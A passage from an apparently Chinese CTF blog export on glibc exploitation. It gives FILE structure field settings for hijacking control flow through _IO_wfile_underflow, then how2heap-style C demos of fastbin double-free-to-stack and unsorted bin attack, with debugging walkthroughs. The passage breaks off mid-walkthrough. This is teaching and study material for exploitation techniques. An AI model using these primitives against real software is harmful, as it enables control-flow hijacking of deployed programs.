<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<h3 id="函数调用链-4"><a href="#函数调用链-4" class="headerlink" title="函数调用链"></a>函数调用链</h3><p><code>_IO_wfile_underflow-&gt;__libio_codecvt_in-&gt;DL_CALL_FCT(gs=fp-&gt;_codecvt-&gt;__cd_in.step)-&gt;*(gs -&gt;__fct)(gs)</code>。</p>
<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p>
<p><strong>详细分析</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。因此可以劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
<h3 id="POC-7"><a href="#POC-7" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div>









<h1 id="house-of-obstack"><a href="#house-of-obstack" class="headerlink" title="house of obstack"></a>house of obstack</h1>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_heap及赛题详细解析</title>
    <url>/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>ptmalloc2</code> 的管理方式，<code>chunk</code> 结构和 <code>bins</code> 的模型，在<a class="link"   href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/" >Overview of GLIBC heap exploitation techniques <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/" >ctfwiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以及<a class="link"   href="https://blog.csdn.net/Tokameine/article/details/119490052" >一些博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>已经讲解的非常清楚，本文记录自己的学习堆利用的过程。主要更新 <code>glibc-2.23，2.27，2.31，2.35，2.37</code> 主流版本和相关例题，<code>glibc-2.23</code> 后面更新一些变化和新的利用方式，这里不包含 <code>IO_FILE</code> 的内容，<code>IO_FILE</code> 会单独做一个专题。建议看完 <code>glibc</code> 源码分析后再来看，当然直接看也无所谓。目前比赛的 <code>glibc</code> 版本基本都是这几个长期支持版本，期间版本就不写了，另外文中没有标记 <code>glibc</code> 版本的就是到目前位置依然适用的方法。我将我的部分文章做了一个合集，入门新手先凑合着看吧。再看从前写的文章，很是稚嫩，不太易读易懂。</p>
<ul>
<li>主要配置</li>
</ul>
<p><a class="link"   href="https://github.com/RoderickChan/pwncli" >pwncli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/scwuaptx/Pwngdb" >PwnGdb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://bbs.kanxue.com/thread-276203.htm" >gdb配置参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>我的主要操作环境</li>
</ul>
<p><code>wsl-kali</code>。配置参考我的<a class="link"   href="https://bbs.kanxue.com/thread-278044.htm" >另一篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><code>docker desktop</code>镜像</p>
<p><code>ubuntu:16.04</code></p>
<p><code>ubuntu:18.04</code></p>
<p><code>ubuntu:20.04</code></p>
<p><code>ubuntu:22.04</code></p>
<p><code>ubuntu:23.04</code></p>
<p>编译时可以加<code>-g</code>来方便调试。</p>
<p><code>ida pro 7.7 + gdb</code>调试。</p>
<ul>
<li>我的<code>.gdbinit</code>文件</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">source ~/Pwngdb/pwngdb.py</span><br><span class="line">source ~/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment">#set context-clear-screen on</span></span><br><span class="line"><span class="comment">#set debug-events off</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /root/splitmind/gdbinit.py</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections = &quot;regs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mode = input(&quot;source/disasm/mixed mode:?(s/d/m)&quot;) or &quot;d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#import splitmind</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter = splitmind.Mind()</span></span><br><span class="line"><span class="comment">#spliter.select(&quot;main&quot;).right(display=&quot;regs&quot;, size=&quot;50%&quot;)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-stack-lines 10&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#legend_on = &quot;code&quot;</span></span><br><span class="line"><span class="comment">#if mode == &quot;d&quot;:</span></span><br><span class="line"><span class="comment">#    legend_on = &quot;disasm&quot;</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;disasm&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elif mode == &quot;s&quot;:</span></span><br><span class="line"><span class="comment">#    sections += &quot; code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;)</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;code&quot;).below(display=&quot;disasm&quot;, size=&quot;40%&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 8&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 20&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections += &quot; args stack backtrace expressions&quot;</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;legend&quot;, on=legend_on)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;stack&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;backtrace&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;args&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;expressions&quot;, on=&quot;args&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-sections \&quot;%s\&quot;&quot; % sections)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set show-retaddr-reg on&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter.build()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure></div>
<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><ul>
<li>house_of_spirit<br><a class="link"   href="https://www.52pojie.cn/thread-1819636-1-1.html" >LCTF 2016 : PWN200 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="built_in">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>使用<code>ubuntu:16.04</code>进行编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F7M2S7WM7URA2WQ.png"
                     
                ><br>使用<code>pwncli</code>改写<code>rpath</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRQV6TQJYQWAXFV.png"
                     
                ><br>在malloc三次后， 0x400743处下断点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U8FQ8QMKCMJEEHE.png"
                     
                ><br>查看堆信息,三个fastbin的堆块，f1,f2,f3。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YBSW3KZB8CFB9PV.png"
                     
                ><br>在free(f1),free(f2),free(f1)后，在0x40083B下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XRP63QAXTP42DB4.png"
                     
                ><br>查看fastbinY信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5PQAMT3K7NY6GSP.png"
                     
                ><br>0x20大小的fastbins链上形成了double free。<br>再次malloc两次后，设断点在0x40089F<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B4MCXD5ETFVSG4E.png"
                     
                ><br>再次查看bins，因为申请两次后，fastbins中剩下f1(0x60300)，而0x60300指向0x603020没有改变，0x603020指向0x60300也没变，并且fastbins中的chunk标记为prev_inuse一直为1，所以fastbins中依然保留这个ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7QJAPUB4DDD2PHB.png"
                     
                ><br>接下来，查看汇编代码，StackVar值改为0x20，为了放入0x20大小的fastbins,接下来把f1指向了StackVar以上0x8处，也就是prev_size的位置。将StackVar放入了0x20的fastbins中。在0x40092C处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PUYYFZPQXKV9KS.png"
                     
                ><br>查看堆信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_TMDXE86NU7SRWS3.png"
                     
                ><br>这时候在申请两次便可申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_WBDHQYTZ4AXN4ZB.png"
                     
                ><br>在0x40095c下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D7WDB4DZ4DJS79F.png"
                     
                ><br>可以看到，已经申请到了栈上的值。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04进行编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>首先申请了两个堆块，第一个堆块不属于fastbin大小，先进入unsortedbin中，第二个堆块为了防止第一块堆块与topchunk合并。在free第一个堆块前设置断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CHJZNE3YDAFDZMS.png"
                     
                ><br>查看bins和heap信息<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CKURHWFQTKVYSZ4.png"
                     
                ><br>free第一个chunk以后，bins和heap信息，unsortedbin里的第一个chunk的fd和bk指向main_arena+0x58的位置。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_E396T5K2YSZR35Q.png"
                     
                ><br>接下来利用uaf将unsortedbin中的第一个chunk的bk指针（rax存储的指针指向fd,rax+8指向bk,bk指向后加入的chunk）指向StackVar的prev_size位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
